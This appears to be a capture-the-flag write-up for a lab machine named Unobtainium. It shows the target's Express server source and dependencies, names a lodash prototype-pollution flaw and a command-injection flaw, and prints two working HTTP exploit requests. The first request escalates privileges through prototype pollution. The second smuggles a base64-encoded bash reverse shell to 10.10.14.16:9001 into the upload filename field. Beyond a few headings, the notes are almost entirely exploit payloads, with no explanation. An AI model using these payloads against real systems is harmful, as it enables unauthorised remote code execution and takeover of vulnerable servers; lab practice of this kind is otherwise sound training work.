# Unobtainium Post Message

![[Pasted image 20210629195504.png]]

# Intercept Traffic and Get Creds

![[Pasted image 20210629195416.png]]


# /todo

![[Pasted image 20210629205708.png]]


```javascript
var root = require("google-cloudstorage-commands");
const express = require('express');
const { exec } = require("child_process");     
const bodyParser = require('body-parser');     
const _ = require('lodash');                                                                  
const app = express();
var fs = require('fs');
                                                                                              
const users = [                                                                               
  {name: 'felamos', password: 'Winter2021'},
  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},      
];

let messages = [];                             
let lastId = 1;                                
                                                                                              
function findUser(auth) {                                                                     
  return users.find((u) =>                                                                    
    u.name === auth.name &&                                                                   
    u.password === auth.password);                                                            
}                                    
                                               
app.use(bodyParser.json());                                                                   
                                               
app.get('/', (req, res) => {                   
  res.send(messages);                                                                         
});                                                                                           
                                                                                              
app.put('/', (req, res) => {   
  const user = findUser(req.body.auth || {});                                                 
                                               
  if (!user) {                                 
    res.status(403).send({ok: false, error: 'Access denied'});                                
    return;
  }

  const message = {
    icon: '__',
  };

  _.merge(message, req.body.message, {
    id: lastId++,
    timestamp: Date.now(),
    userName: user.name,
  });

  messages.push(message);
  res.send({ok: true});
});

app.delete('/', (req, res) => {
  const user = findUser(req.body.auth || {});

  if (!user || !user.canDelete) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }

  messages = messages.filter((m) => m.id !== req.body.messageId);
  res.send({ok: true});
});
app.post('/upload', (req, res) => {
  const user = findUser(req.body.auth || {});
  if (!user || !user.canUpload) {
    res.status(403).send({ok: false, error: 'Access denied'});
    return;
  }


  filename = req.body.filename;
  root.upload("./",filename, true);
  res.send({ok: true, Uploaded_File: filename});
});

app.post('/todo', (req, res) => {
tconst user = findUser(req.body.auth || {});
tif (!user) {
ttres.status(403).send({ok: false, error: 'Access denied'});
ttreturn;
t}

tfilename = req.body.filename;
        testFolder = "/usr/src/app";
        fs.readdirSync(testFolder).forEach(file => {
                if (file.indexOf(filename) > -1) {
                        var buffer = fs.readFileSync(filename).toString();
                        res.send({ok: true, content: buffer});
                }
        });
});

app.listen(3000);
console.log('Listening on port 3000...');
```

# Package.json
```json
{
  "name": "Unobtainium-Server",
  "version": "1.0.0",
  "description": "API Service for Electron client",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "author": "felamos",
  "license": "ISC",
  "dependencies": {
    "body-parser": "1.18.3",
    "express": "4.16.4",
    "lodash": "4.17.4",
    "google-cloudstorage-commands": "0.0.1"
  },
  "devDependencies": {}
}
```

# Lodash: Prototype Pollution 

 # google-cloudstorage-commands : Command Injection 


```HTTP
PUT / HTTP/1.1
Host: unobtainium.htb:31337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/json
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 90

{
"auth":{"name":"felamos","password":"Winter2021"},
"message":{"constructor":{"prototype":{"canDelete":true, "canUpload":true}}}
}
```

```HTTP
POST /upload HTTP/1.1
Host: unobtainium.htb:31337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/json
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 95

{"auth":{"name":"felamos","password":"Winter2021"},"filename":"& echo $(echo 'bash -i >& /dev/tcp/10.10.14.16/9001 0>&1' | base64) | base64 -d | bash"}
```
